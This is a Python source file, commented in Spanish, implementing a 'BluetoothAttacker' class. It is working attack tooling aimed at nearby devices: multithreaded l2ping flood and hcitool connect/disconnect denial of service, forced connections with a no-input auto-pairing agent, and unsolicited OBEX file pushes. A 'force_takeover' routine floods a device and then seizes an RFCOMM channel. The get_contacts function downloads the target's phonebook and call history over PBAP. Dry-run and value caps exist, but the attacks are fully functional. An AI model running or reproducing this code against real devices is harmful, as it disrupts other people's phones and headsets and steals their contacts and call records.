import logging
import os
import shutil
import signal
import subprocess
import threading
import time
import uuid

try:
    from bluetooth import find_service
except ImportError:
    def find_service(*args, **kwargs):
        logger.warning("PyBluez no está instalado; service discovery no está disponible.")
        return []

try:
    from PyOBEX.client import Client
    from PyOBEX.headers import Target
except ImportError:
    Client = None
    Target = object()

from safety_controls import (
    AGGRESSIVE_DOS_DURATION,
    AGGRESSIVE_DOS_THREADS,
    AGGRESSIVE_PACKET_SIZE,
    DEFAULT_DOS_DURATION,
    DEFAULT_DOS_THREADS,
    DEFAULT_PACKET_SIZE,
    MAX_ATTEMPTS,
    MAX_DURATION,
    MAX_HOLD_SECONDS,
    MAX_PACKET_SIZE,
    MAX_THREADS,
    cap_value,
)
from utils import announce_privileged_action

logger = logging.getLogger(__name__)

class BluetoothAttacker:
    """A class to perform Bluetooth attacks."""

    def __init__(self, target_mac, adapter="hci0", dry_run=False):
        """Initializes the attacker with a target MAC address and adapter."""
        self.target_mac = target_mac
        self.adapter = adapter
        self.dry_run = dry_run

    def _dry_run(self, action, commands=None):
        print(f"[DRY-RUN] {action}")
        for command in commands or []:
            print(f"          {' '.join(command)}")
        logger.info("Dry-run action for %s: %s", self.target_mac, action)

    @staticmethod
    def _prompt_int(prompt_text, default, minimum=1):
        message = f"{prompt_text} [{default}]: "
        try:
            raw = input(message).strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Entrada no disponible. Usando valor por defecto.")
            return default
        if not raw:
            return default
        try:
            value = int(raw)
        except ValueError:
            print("[!] Valor inválido. Usando valor por defecto.")
            return default
        if value < minimum:
            print(f"[!] El valor mínimo permitido es {minimum}. Usando {minimum}.")
            return minimum
        return value

    @staticmethod
    def _prompt_yes_no(prompt_text, default=False):
        suffix = "[S/n]" if default else "[s/N]"
        try:
            raw = input(f"{prompt_text} {suffix}: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return default
        if not raw:
            return default
        return raw in {"s", "si", "y", "yes"}

    def dos_attack(self, threads_count=DEFAULT_DOS_THREADS, package_size=DEFAULT_PACKET_SIZE, duration=None, mode="auto"):
        """Performs a combined DoS attack using L2CAP flood and connection stress."""
        if mode == "interactive":
            print(f"[*] Configuración interactiva de ataque DoS contra {self.target_mac}")
            threads_count = self._prompt_int("Número de hilos totales", threads_count, minimum=1)
            package_size = self._prompt_int("Tamaño del paquete (bytes)", package_size, minimum=1)
            if duration is None:
                duration = DEFAULT_DOS_DURATION
            duration = self._prompt_int("Duración del ataque (segundos, 0 = indefinido)", duration, minimum=0)
            if duration == 0:
                duration = None
        elif mode == "aggressive":
            threads_count = max(threads_count, AGGRESSIVE_DOS_THREADS)
            package_size = max(package_size, AGGRESSIVE_PACKET_SIZE)
            if duration is None:
                duration = AGGRESSIVE_DOS_DURATION
        else:
            threads_count = threads_count or DEFAULT_DOS_THREADS
            package_size = package_size or DEFAULT_PACKET_SIZE
            if duration is None:
                duration = DEFAULT_DOS_DURATION

        threads_count = cap_value(threads_count, MAX_THREADS, "threads")
        package_size = cap_value(package_size, MAX_PACKET_SIZE, "package_size")
        if duration is not None:
            duration = cap_value(duration, MAX_DURATION, "duration")

        if self.dry_run:
            self._dry_run(
                f"Plan DoS contra {self.target_mac} (adapter={self.adapter}, threads={threads_count}, "
                f"packet_size={package_size}, duration={duration}, mode={mode})",
                [
                    ["sudo", "l2ping", "-i", self.adapter, "-s", str(package_size), "-f", self.target_mac],
                    ["sudo", "hcitool", "-i", self.adapter, "cc", self.target_mac],
                    ["sudo", "hcitool", "-i", self.adapter, "dc", self.target_mac],
                ],
            )
            return

        announce_privileged_action(
            "el ataque DoS usa l2ping y hcitool con privilegios para manipular conexiones Bluetooth",
            "attacker.dos_attack",
        )

        print(f"[*] Iniciando ataque de estrés combinado a {self.target_mac}...")
        if duration:
            print(f"[*] El ataque se detendrá automáticamente después de {duration} segundos.")
        print(f"[*] Usando {threads_count} hilos en total. Presiona Ctrl+C para detener.")
        logger.info(
            "Starting DoS attack on %s (adapter=%s, threads=%s, packet_size=%s, duration=%s, mode=%s)",
            self.target_mac,
            self.adapter,
            threads_count,
            package_size,
            duration,
            mode,
        )

        stop_event = threading.Event()
        
        num_l2ping_threads = threads_count // 2
        num_hcitool_threads = threads_count - num_l2ping_threads
        
        print(f"[*] Asignando {num_l2ping_threads} hilos para L2CAP flood y {num_hcitool_threads} para estrés de conexión.")

        threads = []

        # Worker para l2ping (proceso de larga duración)
        def l2ping_worker():
            cmd = ["sudo", "l2ping", "-i", self.adapter, "-s", str(package_size), "-f", self.target_mac]
            # Inicia el proceso en un nuevo grupo para poder detenerlo de forma fiable
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                preexec_fn=os.setsid,
            )
            
            stop_event.wait() # El hilo espera la señal de parada
            
            try:
                # Envía señal SIGKILL a todo el grupo de procesos
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except ProcessLookupError:
                pass # El proceso ya no existe

        # Worker para el bucle de hcitool
        def hcitool_worker():
            while not stop_event.is_set():
                try:
                    subprocess.run(
                        ["sudo", "hcitool", "-i", self.adapter, "cc", self.target_mac],
                        timeout=2,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL,
                    )
                    subprocess.run(
                        ["sudo", "hcitool", "-i", self.adapter, "dc", self.target_mac],
                        timeout=2,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL,
                    )
                except Exception:
                    pass # Ignorar errores y continuar
        
        for _ in range(num_l2ping_threads):
            threads.append(threading.Thread(target=l2ping_worker))
        
        for _ in range(num_hcitool_threads):
            threads.append(threading.Thread(target=hcitool_worker))

        try:
            for t in threads:
                t.start()
            
            deadline = time.time() + duration if duration else None
            last_report = 0
            while not stop_event.is_set():
                if deadline and time.time() >= deadline:
                    print("[*] Tiempo límite alcanzado; deteniendo ataque DoS.")
                    logger.info("DoS attack duration elapsed for %s", self.target_mac)
                    break
                if deadline:
                    remaining = int(deadline - time.time())
                    if remaining < 0:
                        remaining = 0
                    if remaining != last_report:
                        print(f"\r[*] Tiempo restante estimado: {remaining:>4} s", end="", flush=True)
                        last_report = remaining
                time.sleep(1)

        except KeyboardInterrupt:
            print("\n[*] Deteniendo el ataque...")
            logger.info("DoS attack interrupted by user for %s", self.target_mac)
        
        finally:
            stop_event.set()
            if deadline:
                print()
            print("[*] Esperando a que los hilos terminen...")
            for t in threads:
                t.join()
            
            print("[+] Ataque detenido y limpieza finalizada.")
            logger.info("DoS attack finished for %s", self.target_mac)

    def _discover_obex_channels(self):
        matches = []
        try:
            services = find_service(address=self.target_mac)
        except Exception as exc:
            logger.warning("Service discovery for OBEX on %s failed: %s", self.target_mac, exc)
            services = []

        for service in services:
            name = (service.get("name") or "Desconocido").strip()
            port = service.get("port")
            if not port:
                continue

            profiles = [p[0] if isinstance(p, tuple) else p for p in service.get("profiles", [])]
            profile_str = ", ".join(profiles) if profiles else ""
            lower_name = name.lower()
            if "obex" in lower_name or "phonebook" in lower_name or "message access" in lower_name:
                matches.append({"name": name, "channel": port, "profiles": profile_str})
            elif profiles:
                profile_lower = profile_str.lower()
                if "obex" in profile_lower or "phonebook" in profile_lower:
                    matches.append({"name": name, "channel": port, "profiles": profile_str})

        return matches

    def send_file(self, file_path, channel=None, mode="auto"):
        """Sends a file to the target device."""
        if not os.path.exists(file_path):
            print(f"[!] Error: El archivo '{file_path}' no existe.")
            logger.warning("File %s not found; cannot send to %s", file_path, self.target_mac)
            return

        remote_filename = os.path.basename(file_path)
        sender = shutil.which("ussp-push")
        obexftp = shutil.which("obexftp")

        selected_channel = channel
        channels_info = self._discover_obex_channels()

        if mode == "interactive":
            print("[*] Configuración interactiva de envío OBEX")
            if channels_info:
                print("[*] Servicios OBEX detectados:")
                for idx, info in enumerate(channels_info, start=1):
                    profile_txt = f" ({info['profiles']})" if info.get("profiles") else ""
                    print(f"   {idx}. {info['name']} - Canal {info['channel']}{profile_txt}")
                choice = self._prompt_int("Selecciona un servicio (0 para ingresar canal manualmente)", 1, minimum=0)
                if choice == 0:
                    selected_channel = self._prompt_int("Canal OBEX manual", channel or 9, minimum=1)
                else:
                    index = min(choice, len(channels_info)) - 1
                    selected_channel = channels_info[index]["channel"]
            else:
                print("[-] No se detectaron servicios OBEX automáticamente.")
                selected_channel = self._prompt_int("Ingresa el canal OBEX manualmente", channel or 9, minimum=1)
        else:
            if selected_channel is None:
                if channels_info:
                    selected_channel = channels_info[0]["channel"]
                    logger.info(
                        "Auto-selected OBEX channel %s for %s (service=%s)",
                        selected_channel,
                        self.target_mac,
                        channels_info[0]["name"],
                    )
                else:
                    selected_channel = 9
                    logger.warning("No OBEX services detected for %s. Falling back to channel 9.", self.target_mac)

        if self.dry_run:
            target_channel = selected_channel or 9
            self._dry_run(
                f"Plan de envío OBEX de {file_path} a {self.target_mac} por canal {target_channel}",
                [["sudo", "ussp-push", f"{self.target_mac}@{target_channel}", file_path, remote_filename]],
            )
            return

        announce_privileged_action(
            "el envío OBEX utiliza herramientas del sistema con sudo para transferir archivos al objetivo",
            "attacker.send_file",
        )

        print(f"[*] Enviando archivo {file_path} a {self.target_mac}...")
        logger.info("Using OBEX channel %s for file transfer to %s", selected_channel, self.target_mac)

        method = None
        try:
            if sender:
                method = sender
                completed = subprocess.run(
                    ["sudo", sender, f"{self.target_mac}@{selected_channel}", file_path, remote_filename],
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.DEVNULL,
                    text=True,
                )
                method = sender
            elif obexftp:
                method = obexftp
                completed = subprocess.run(
                    [
                        "sudo",
                        obexftp,
                        "--nopp",
                        "--bluetooth",
                        self.target_mac,
                        "--channel",
                        str(selected_channel),
                        "--put",
                        file_path,
                    ],
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.DEVNULL,
                    text=True,
                )
                method = obexftp
            else:
                print("[-] No se encontró una herramienta compatible (ussp-push/obexftp) para enviar archivos.")
                logger.error("Neither ussp-push nor obexftp available to send file %s", file_path)
                return

            print(f"[+] Archivo enviado a {self.target_mac}")
            logger.info(
                "File %s sent to %s using %s (stdout=%s, stderr=%s)",
                file_path,
                self.target_mac,
                method,
                completed.stdout.strip(),
                completed.stderr.strip(),
            )
        except (subprocess.CalledProcessError, FileNotFoundError) as e:
            print(f"[-] No se pudo enviar el archivo a {self.target_mac}: {e}")
            logger.error(
                "Failed to send %s to %s using %s: %s",
                file_path,
                self.target_mac,
                method or "unknown",
                e,
            )

    def disconnect(self, attempts=10, auto_pair=False, hold_seconds=10, mode="auto"):
        """Tries to forcibly connect to a device, optionally handling pairing."""
        if mode == "interactive":
            print(f"[*] Configuración interactiva de ataque de conexión forzada contra {self.target_mac}")
            attempts = self._prompt_int("Número de intentos de conexión", attempts, minimum=1)
            hold_seconds = self._prompt_int("Tiempo para mantener la conexión (segundos)", hold_seconds, minimum=0)
            auto_pair = self._prompt_yes_no("¿Activar agente de auto-emparejamiento?", auto_pair)
        elif mode == "aggressive":
            attempts = max(attempts, 15)
            hold_seconds = max(hold_seconds, 15)

        attempts = cap_value(attempts, MAX_ATTEMPTS, "attempts")
        hold_seconds = cap_value(hold_seconds, MAX_HOLD_SECONDS, "hold_seconds")

        if self.dry_run:
            commands = [["sudo", "hcitool", "-i", self.adapter, "cc", self.target_mac]]
            if auto_pair:
                commands.insert(0, ["sudo", "bt-agent", "-c", "NoInputNoOutput"])
            self._dry_run(
                f"Plan de conexión forzada contra {self.target_mac} "
                f"(attempts={attempts}, hold_seconds={hold_seconds}, auto_pair={auto_pair}, mode={mode})",
                commands,
            )
            return

        announce_privileged_action(
            "el ataque de conexión forzada usa bt-agent y hcitool con privilegios de superusuario",
            "attacker.disconnect",
        )

        print(f"[*] Iniciando ataque de conexión forzada a {self.target_mac}...")
        adapter_arg = ["-i", self.adapter]
        agent_process = None

        if auto_pair:
            print("[*] Activando agente de auto-emparejamiento...")
            try:
                agent_process = subprocess.Popen(
                    ["sudo", "bt-agent", "-c", "NoInputNoOutput"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    preexec_fn=os.setsid,
                )
                logger.info("Auto-pair agent started for %s", self.target_mac)
            except FileNotFoundError:
                print("[!] Error: 'bt-agent' no encontrado. No se puede usar --auto-pair.")
                logger.error("bt-agent not available; auto-pair disabled for %s", self.target_mac)
                return

        try:
            for i in range(attempts):
                print(f"    -> Intento {i + 1}/{attempts}")
                try:
                    subprocess.run(["sudo", "hcitool"] + adapter_arg + ["cc", self.target_mac], timeout=10, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    active_connections = subprocess.check_output(["hcitool", "con"], text=True)
                    logger.debug("Attempt %s: active connections output: %s", i + 1, active_connections.strip())
                    
                    if self.target_mac in active_connections:
                        print(f"[+] ¡CONECTADO! Ahora tienes el control sobre {self.target_mac}.")
                        print("    Puedes intentar usar otros comandos en una terminal separada (ej. sdptool, obexftp, etc.)")
                        logger.info("Forced connection established with %s (hold_seconds=%s, mode=%s)", self.target_mac, hold_seconds, mode)
                        if hold_seconds > 0:
                            print(f"[*] Manteniendo la conexión durante {hold_seconds} segundos antes de liberar...")
                            time.sleep(hold_seconds)
                        try:
                            print(f"[*] Desconectando de {self.target_mac}...")
                            subprocess.run(["sudo", "hcitool"] + adapter_arg + ["dc", self.target_mac], timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                            print("[+] Desconectado limpiamente.")
                            logger.info("Forced connection to %s disconnected cleanly", self.target_mac)
                        except Exception as e:
                            print(f"[!] No se pudo desconectar limpiamente: {e}")
                            logger.error("Failed to disconnect cleanly from %s: %s", self.target_mac, e)
                        return

                except subprocess.TimeoutExpired:
                    print("    -> El comando de conexión expiró, reintentando...")
                    logger.debug("Connection attempt to %s timed out", self.target_mac)
                except subprocess.CalledProcessError:
                    print("    -> El dispositivo rechazó la conexión o ya está conectado. Reintentando...")
                    logger.debug("Connection to %s rejected or already connected", self.target_mac)
                except (FileNotFoundError, Exception) as e:
                    print(f"[!] Error crítico durante el ataque: {e}")
                    logger.exception("Critical error during forced connection to %s: %s", self.target_mac, e)
                    break

            print(f"[-] No se pudo establecer una conexión persistente con {self.target_mac} después de {attempts} intentos.")
            logger.warning("Failed to establish forced connection to %s after %s attempts", self.target_mac, attempts)
        finally:
            if agent_process:
                print("[*] Desactivando agente de auto-emparejamiento...")
                try:
                    os.killpg(os.getpgid(agent_process.pid), signal.SIGTERM)
                    agent_process.wait(timeout=5)
                    logger.info("Auto-pair agent for %s terminated gracefully", self.target_mac)
                except (ProcessLookupError, PermissionError):
                    logger.debug("Auto-pair agent already terminated for %s", self.target_mac)
                except subprocess.TimeoutExpired:
                    os.killpg(os.getpgid(agent_process.pid), signal.SIGKILL)
                    logger.warning("Auto-pair agent for %s required SIGKILL", self.target_mac)

    def rfcomm_connect(self, channel):
        """Establishes a persistent RFCOMM connection to a specific channel."""
        print(f"[*] Intentando establecer una conexión RFCOMM con {self.target_mac} en el canal {channel}...")
        print("[*] Si tiene éxito, se creará un dispositivo /dev/rfcommX.")
        print("[*] La conexión permanecerá activa. Presiona Ctrl+C para desconectar.")

        if self.dry_run:
            self._dry_run(
                f"Plan de conexión RFCOMM a {self.target_mac} canal {channel}",
                [["sudo", "rfcomm", "-i", self.adapter, "connect", self.target_mac, str(channel)]],
            )
            return

        announce_privileged_action(
            "establecer y liberar conexiones RFCOMM requiere permisos elevados sobre la pila Bluetooth",
            "attacker.rfcomm_connect",
        )
        
        try:
            subprocess.run(
                ["sudo", "rfcomm", "-i", self.adapter, "connect", self.target_mac, str(channel)],
                check=True,
                stdin=subprocess.DEVNULL,
            )
            logger.info("RFCOMM connection command executed for %s on channel %s", self.target_mac, channel)
        except FileNotFoundError:
            print("[!] Error: El comando 'rfcomm' no fue encontrado.")
            logger.error("rfcomm command not found when connecting to %s", self.target_mac)
        except subprocess.CalledProcessError as e:
            print(f"[-] La conexión RFCOMM falló o fue rechazada (código: {e.returncode}).")
            logger.warning("RFCOMM connection to %s on channel %s failed with %s", self.target_mac, channel, e.returncode)
        except KeyboardInterrupt:
            print("\n[+] Conexión RFCOMM terminada por el usuario.")
            logger.info("RFCOMM connection to %s interrupted by user", self.target_mac)
        finally:
            print("[*] Finalizó la sesión RFCOMM. No se ejecuta 'rfcomm release all' para no afectar otras conexiones.")
            logger.info("RFCOMM session finished for target %s without global release.", self.target_mac)

    def pair_and_trust(self):
        """Guides the user to pair and trust a device using bluetoothctl."""
        print("[*] --- Guía para Emparejamiento y Confianza Manual ---")
        print("[*] Este proceso se realiza una sola vez por cada dispositivo.")
        print("[*] La herramienta 'bluetoothctl' es interactiva y puede requerir tu intervención.")
        print("\n1. Abre una NUEVA terminal.")
        print("2. Escribe el siguiente comando para iniciar la herramienta:")
        print("   sudo bluetoothctl")
        print("\n3. Una vez dentro de bluetoothctl (verás un prompt [bluetooth]#), escribe estos comandos:")
        print("   (Puedes copiar y pegar cada línea)")
        print("\n   # Activa el escaneo para encontrar tu dispositivo")
        print("   scan on")
        print("\n   # Espera a que aparezca tu dispositivo en la lista. Cuando lo veas, puedes detener el escaneo:")
        print("   scan off")
        print("\n   # Inicia el emparejamiento (reemplaza <MAC> por la MAC objetivo):")
        print(f"   pair {self.target_mac}")
        print("   -> ATENCIÓN: Puede que necesites confirmar un PIN en el dispositivo o escribir 'yes' en la terminal.")
        print("\n   # Marca el dispositivo como de confianza para futuras conexiones:")
        print(f"   trust {self.target_mac}")
        print("\n   # Sal de la herramienta:")
        print("   quit")
        print("\n[*] ¡Proceso finalizado! El dispositivo ahora está emparejado y es de confianza.")
        print("[*] Ya puedes usar el comando 'rfcomm_connect' para establecer una conexión persistente.")
        logger.info("Displayed pair and trust instructions for %s", self.target_mac)

    def force_takeover(self, channel, dos_duration=20, dos_threads=10, package_size=600, mode="auto"):
        """Runs a DoS attack for a duration, then attempts an RFCOMM connection."""
        if mode == "interactive":
            print(f"[*] Configuración interactiva de force takeover contra {self.target_mac}")
            channel = self._prompt_int("Canal RFCOMM objetivo", channel, minimum=1)
            dos_duration = self._prompt_int("Duración del DoS (segundos)", dos_duration, minimum=1)
            dos_threads = self._prompt_int("Número de hilos DoS", dos_threads, minimum=1)
            package_size = self._prompt_int("Tamaño de paquete L2CAP (bytes)", package_size, minimum=1)
        elif mode == "aggressive":
            dos_threads = max(dos_threads, AGGRESSIVE_DOS_THREADS)
            package_size = max(package_size, AGGRESSIVE_PACKET_SIZE)
            dos_duration = max(dos_duration, 60)

        dos_threads = cap_value(dos_threads, MAX_THREADS, "threads")
        package_size = cap_value(package_size, MAX_PACKET_SIZE, "package_size")
        dos_duration = cap_value(dos_duration, MAX_DURATION, "duration")

        if self.dry_run:
            self._dry_run(
                f"Plan force_takeover contra {self.target_mac} "
                f"(channel={channel}, duration={dos_duration}, threads={dos_threads}, packet_size={package_size}, mode={mode})",
                [
                    ["sudo", "l2ping", "-i", self.adapter, "-s", str(package_size), "-f", self.target_mac],
                    ["sudo", "rfcomm", "-i", self.adapter, "connect", self.target_mac, str(channel)],
                ],
            )
            return

        print(f"[*] Iniciando Fase 1: Ataque DoS de {dos_duration} segundos para liberar la conexión.")
        logger.info(
            "Starting force takeover on %s (channel=%s, duration=%s, threads=%s, packet_size=%s, mode=%s)",
            self.target_mac,
            channel,
            dos_duration,
            dos_threads,
            package_size,
            mode,
        )
        
        announce_privileged_action(
            "la fase DoS del takeover usa l2ping en modo flood con privilegios elevados",
            "attacker.force_takeover.dos",
        )

        dos_processes = []
        try:
            for _ in range(dos_threads):
                cmd = ["sudo", "l2ping", "-i", self.adapter, "-s", str(package_size), "-f", self.target_mac]
                proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    preexec_fn=os.setsid,
                )
                dos_processes.append(proc)
            
            print(f"[*] Ataque DoS en curso con {dos_threads} hilos. Esperando {dos_duration} segundos...")
            deadline = time.time() + dos_duration
            last_report = dos_duration
            while True:
                remaining = int(deadline - time.time())
                if remaining <= 0:
                    break
                if remaining < last_report:
                    print(f"\r[*] Tiempo restante en fase DoS: {remaining:>4} s", end="", flush=True)
                    last_report = remaining
                time.sleep(1)
            print()

        finally:
            print("[*] Finalizando Fase 1: Deteniendo el ataque DoS.")
            for proc in dos_processes:
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                except ProcessLookupError:
                    continue
            # Esperar a que los procesos terminen realmente
            for proc in dos_processes:
                try:
                    proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    try:
                        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                    except ProcessLookupError:
                        pass

        print("\n[*] Iniciando Fase 2: Intentando conexión RFCOMM inmediata.")
        logger.info("Force takeover entering RFCOMM phase on %s (channel=%s)", self.target_mac, channel)
        self.rfcomm_connect(channel)

    def get_contacts(self):
        """
        Attempts to download the phonebook from the target device using PyOBEX.
        """
        if Client is None:
            print("[!] PyOBEX no está instalado; no se puede usar get_contacts.")
            logger.error("PyOBEX is not available; get_contacts cannot run for %s", self.target_mac)
            return

        print(f"[*] Buscando el servicio de Phonebook Access (PBAP) en {self.target_mac}...")
        logger.info("Scanning PBAP service on %s", self.target_mac)
        
        # PBAP Service UUID for service discovery
        pbap_sdp_uuid = "0000112f-0000-1000-8000-00805f9b34fb"
        
        service_matches = find_service(uuid=pbap_sdp_uuid, address=self.target_mac)

        if not service_matches:
            print("[-] No se pudo encontrar el servicio PBAP. El dispositivo puede no ser vulnerable o el servicio estar desactivado.")
            logger.warning("PBAP service not found on %s", self.target_mac)
            return

        first_match = service_matches[0]
        port = first_match["port"]
        host = first_match["host"]

        print(f"[+] Servicio PBAP encontrado en el canal RFCOMM {port}.")
        logger.info("PBAP service found on %s (host=%s, port=%s)", self.target_mac, host, port)
        
        client = Client(host, port)
        
        # PBAP UUID for OBEX Target header
        pbap_target_uuid = uuid.UUID("{0000112f-0000-1000-8000-00805f9b34fb}").bytes

        if self.dry_run:
            self._dry_run(
                f"Plan de descarga PBAP desde {self.target_mac} (host={host}, port={port})",
                [["PyOBEX", "GET", "telecom/pb.vcf"], ["PyOBEX", "GET", "telecom/ich.vcf"]],
            )
            return

        connected = False
        try:
            print(f"[*] Conectando al servicio OBEX con el target PBAP...")
            client.connect({Target: pbap_target_uuid})
            connected = True
        except Exception as e:
            print(f"[-] Fallo al conectar al servicio OBEX: {e}")
            logger.error("Failed to connect to OBEX PBAP on %s: %s", self.target_mac, e)
            return

        print("[+] Conectado al servicio OBEX.")
        logger.info("Connected to OBEX PBAP on %s", self.target_mac)
        
        # Define remote and local paths
        remote_path_pb = "telecom/pb.vcf"
        local_path_pb = f"contacts_{self.target_mac.replace(':', '')}.vcf"
        remote_path_ch = "telecom/ich.vcf"
        local_path_ch = f"calllog_{self.target_mac.replace(':', '')}.vcf"

        # --- Download Phonebook ---
        print(f"[*] Intentando descargar la agenda ({remote_path_pb})...")
        try:
            headers, data = client.get(remote_path_pb)
            if data:
                with open(local_path_pb, 'wb') as f:
                    f.write(data)
                print(f"[+] ¡Éxito! Agenda guardada en: {local_path_pb}")
                logger.info("Phonebook downloaded from %s to %s", self.target_mac, local_path_pb)
            else:
                print("[-] La descarga de la agenda devolvió datos vacíos.")
                logger.warning("Phonebook download returned empty data from %s", self.target_mac)
        except Exception as e:
            print(f"[-] Fallo al descargar la agenda: {e}")
            logger.error("Failed to download phonebook from %s: %s", self.target_mac, e)

        print("-" * 20)

        # --- Download Call History ---
        print(f"[*] Intentando descargar el historial de llamadas ({remote_path_ch})...")
        try:
            headers, data = client.get(remote_path_ch)
            if data:
                with open(local_path_ch, 'wb') as f:
                    f.write(data)
                print(f"[+] ¡Éxito! Historial de llamadas guardado en: {local_path_ch}")
                logger.info("Call history downloaded from %s to %s", self.target_mac, local_path_ch)
            else:
                print("[-] La descarga del historial de llamadas devolvió datos vacíos.")
                logger.warning("Call history download returned empty data from %s", self.target_mac)
        except Exception as e:
            print(f"[-] Fallo al descargar el historial de llamadas: {e}")
            logger.error("Failed to download call history from %s: %s", self.target_mac, e)
        
        finally:
            if connected:
                print("[*] Desconectando del servicio OBEX.")
                try:
                    client.disconnect()
                    logger.info("Disconnected from OBEX PBAP on %s", self.target_mac)
                except Exception as e:
                    logger.warning("Error disconnecting from OBEX PBAP on %s: %s", self.target_mac, e)
